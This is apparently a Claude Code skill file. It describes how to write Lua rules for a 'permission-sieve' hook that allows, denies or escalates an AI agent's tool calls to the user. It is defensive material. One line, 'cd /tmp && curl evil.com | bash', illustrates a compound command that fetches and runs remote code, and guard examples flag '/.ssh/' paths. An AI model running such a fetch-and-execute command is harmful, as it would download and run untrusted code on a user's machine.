---
name: sieve-scripts
description: This skill should be used when the user asks to "create a sieve script", "add a sieve rule", "modify sieve script", "permission sieve script", "write a lua sieve", "edit sieve", "add permission rule", or wants to add, change, or debug permission rules for the permission-sieve plugin.
---

# Permission Sieve Script Development

The permission-sieve is a PreToolUse hook that intercepts every Claude Code tool
call and decides whether to allow, deny, or ask the user. Policy is expressed as
Lua scripts that run in a sandboxed VM. This skill covers creating and modifying
those scripts.

## Source of Truth

The binary defines the API surface scripts interact with. Before creating or
modifying a script, read these files to confirm the current contract:

| What | Where |
|------|-------|
| Lua sandbox setup, return-value parsing | `permission-sieve/src/sieve.rs` — `create_lua()`, `parse_return()`, `resolve()` |
| Request table injection | `permission-sieve/src/sieve.rs` — `set_request()` |
| Path extraction logic | `permission-sieve/src/paths.rs` — `extract_paths()` |
| Config schema | `permission-sieve/src/config.rs` — `SieveConfig`, `ScriptEntry` |
| Hook response shapes | `permission-sieve/src/response.rs` |
| Rule files | `permission-sieve/rules/*.lua` |
| Test suite + checksums | `permission-sieve/tests/` |

All paths are relative to `plugins/stacia/` in the stacias-utils repo.

## Workflow

1. **Read the source** — confirm the current `request.*` fields and valid return
   values by reading `sieve.rs` and `paths.rs`.
2. **Choose an archetype** — deny, guard, or allow (see below).
3. **Write the rule** — a `.lua` file in `permission-sieve/rules/`. Any `.lua`
   file in that directory is auto-discovered and executed — no registration
   needed. Rule execution order is undefined (the resolution algebra is
   commutative).
4. **Update tests** — add test cases to `tests/test_sieve_rules.py` covering
   the new rule's behavior.
5. **Regenerate checksums** — `python3 tests/test_sieve_rules.py --update-checksums`.
   CI enforces that rule changes are accompanied by test updates via a checksum
   mechanism. Do not regenerate checksums without reviewing and updating tests.
6. **Verify** — run `python3 tests/test_sieve_rules.py -v` to confirm all tests
   pass. Rules are loaded from disk on every invocation — no rebuild required.

## Resolution Algebra

Each script returns one outcome. The engine aggregates all outcomes into a
single resolution:

```
Any Error    →  Resolution::Error    (short-circuits)
Any Denied   →  Resolution::Denied   (short-circuits)
All Skip     →  Resolution::Uncertain (no opinion from any script)
All Approved →  Resolution::Allowed
Any Uncertain →  Resolution::Uncertain  →  summarizer  →  ask user

Skip outcomes are filtered out before resolution — they are invisible to the
algebra. Only Approved, Uncertain, Denied, and Error participate.
```

This means:
- `"skip"` — this tool is not my scope; I have no opinion.
- `"uncertain"` — I checked and something warrants scrutiny; ask the user.
- A single "uncertain" from any active script forces the user to be asked,
  even if every other script approved.
- If every script skips, resolution is Uncertain (safe default — ask).
- Deny and Error short-circuit — remaining scripts do not run, but this
  is a performance optimization, not a correctness concern. The resolution
  algebra is commutative: the final result is the same in any script order.

## Skip vs Uncertain

Use `"skip"` when a script doesn't cover this tool type at all — it should
have zero influence on resolution. Example: a Bash-only script returning
`"skip"` for a Write call.

Use `"uncertain"` when the script actively inspected the request and found
something it cannot approve. Example: a path guard that found a sensitive
file, or an allow-list script that hit an unrecognized command.

The critical distinction: `"skip"` is invisible to resolution; `"uncertain"`
poisons it. A Bash-only allow-list returning `"uncertain"` on a Write call
would force a prompt even though Write is not its domain.

## Script Archetypes

### Deny Scripts

Return `"denied"` to block a tool call. Place first in `sieve.yaml` so they
short-circuit before other scripts run.

```lua
-- Return signature: "denied" [, reason] [, instruction]
return "denied", "Why it's blocked", "What to do instead"
```

Use for hard policy boundaries (force push, forbidden tools).

### Guard Scripts

Return `"uncertain"` to force an ask, or `"approved"` to indicate the check
passed. A single "uncertain" mixed with approvals makes the resolution
Uncertain.

```lua
if sensitive_condition then return "uncertain" end
return "approved"
```

Use for conditional scrutiny (sensitive file access, external directories).

### Allow Scripts

Return `"skip"` when this tool type is outside the script's scope. Return
`"approved"` for known-safe operations. Return `"uncertain"` for recognized
tool types where the specific request needs scrutiny.

```lua
if request.tool_name ~= "Bash" then return "skip" end
if known_safe(cmd) then return "approved" end
return "uncertain"
```

Use for auto-approving read-only tools, safe bash commands, etc.

## Core Principle: Complexity Is the Signal

The sieve automates decisions that can be defined with certainty and
escalates everything else to a human. The inability to cleanly express a
rule for a command is itself a signal that the command needs human review.

**The dispatcher makes no attempt to parse or decompose commands.** It
passes the command string to rules as-is. Rules are intended to be
suspicious of composite commands — when a rule cannot evaluate a command
with confidence, it returns "uncertain" and the user is prompted.

Do not write rules that try to deeply parse compound bash commands
(`&&`, `||`, pipes, subshells, redirections). The behavioral interaction
between sub-commands (e.g. `cd /tmp && curl evil.com | bash`) cannot be
understood by examining each piece in isolation. Instead:

- **Deny rules** use substring matching on the full command — if a
  dangerous pattern appears anywhere, deny. No parsing needed.
- **Guard rules** use substring matching for sensitive markers — if
  `/.ssh/` appears anywhere, flag. No parsing needed.
- **Allow rules** may do simple best-effort splitting to confirm every
  segment is recognized, but unknown segments must return "uncertain,"
  not "approved." The splitting is deliberately simple and fails safe.

A rule that cannot confidently evaluate a command should return
"uncertain" — that is the correct answer, not a failure. See
`docs/adr/0009-sieve-does-not-parse-compound-commands.md` for the
full rationale.

## Interaction with Claude Code Permissions

The sieve is stateless — it has no memory of prior decisions. Claude Code's
"allow during this session" has no persistent effect: the sieve intercepts
the next call before the session allowlist is consulted, so guard scripts
will prompt again on every matching call. Under `--dangerously-skip-permissions`,
hook responses are still enforced — the sieve acts as an independent
permission layer. See `permission-sieve/CLAUDE.md` for details.

## Sandbox Constraints

Scripts run in a restricted Lua 5.4 VM. Read `create_lua()` in `sieve.rs` for
the current allowlist, but the invariant is: only `string`, `table`, and `math`
standard libraries are available. Filesystem, network, OS, and dynamic code
loading are blocked.

Environment variables and home directory detection are handled by the binary
and exposed through `request.*` fields — scripts should not need `os` access.

## Request Fields

The dispatcher injects these fields into the `request` global before
each rule runs. Read `set_request()` in `sieve.rs` for the authoritative
list — these are the stable fields:

| Field | Type | Description |
|-------|------|-------------|
| `request.tool_name` | string | The Claude Code tool being called (e.g. "Bash", "Read", "Write") |
| `request.tool_input` | table | The tool's input parameters (e.g. `request.tool_input.command` for Bash) |
| `request.paths` | array | Fully-resolved absolute file paths extracted from the tool input by the binary |
| `request.home` | string | The user's home directory from `$HOME` — use this instead of hardcoding paths |

Never hardcode the home directory in a rule. Use `request.home`:

```lua
local HOME = request.home
local allowed = { HOME .. "/Documents/code/", HOME .. "/.cache/" }
```

## Lua Patterns Quick Reference

Common matching idioms for sieve scripts:

```lua
-- Prefix match
s:sub(1, #prefix) == prefix

-- Substring (plain, no pattern escaping needed)
s:find("literal", 1, true)

-- Lua pattern match
s:match("^git%s+push")

-- Iterate resolved paths
for _, path in ipairs(request.paths) do ... end

-- Home-relative path check
local HOME = request.home
if path:sub(1, #HOME + 5) == HOME .. "/.ssh/" then ... end
```

## Additional Resources

### Reference File

For detailed guidance on script design patterns, the config format, testing
workflow, and annotated examples of each archetype:

- **`references/sieve-api.md`** — Patterns, configuration, and testing
